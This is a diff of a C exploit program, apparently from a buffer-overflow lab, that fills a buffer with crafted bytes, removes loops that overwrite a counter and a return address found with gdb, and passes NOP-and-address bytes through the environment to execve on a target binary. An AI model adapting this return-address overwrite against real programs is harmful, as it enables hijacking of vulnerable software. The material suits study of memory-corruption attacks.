@@ -76,29 +76,11 @@ main ( int argc, char * argv[] )
         buf[i+1] = '\x01';
         buf[i]   = '\x1b';
     }
-   // buf[267] = '\x00';
-
-    // write '264' to i 
-    for (; i < 272; i = i+4) {
-        buf[i+3] = '\x00';
-        buf[i+2] = '\x00';
-        buf[i+1] = '\x01';
-        buf[i]   = '\x0c';
-    }
-
-    // Return address of 'buf' is 0x2021fde0
-    // (determined by checking gdb)
-    for (; i < 284; i = i+4) {
-        buf[i+3] = '\x20';
-        buf[i+2] = '\x21';
-        buf[i+1] = '\xfd';
-        buf[i]   = '\xe0';
-    }
 
     args[1] = buf;
 	args[2] = NULL;
-	//env[0] = '\x00';
-    env[0] = "\x0c\x01\x90\x90\xe0\xfd\x21\x20";
+    //env[0] = '\x00';
+    env[1] = "\x90\x0c\x01\x90\x90\xe0\xfd\x21\x20";
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
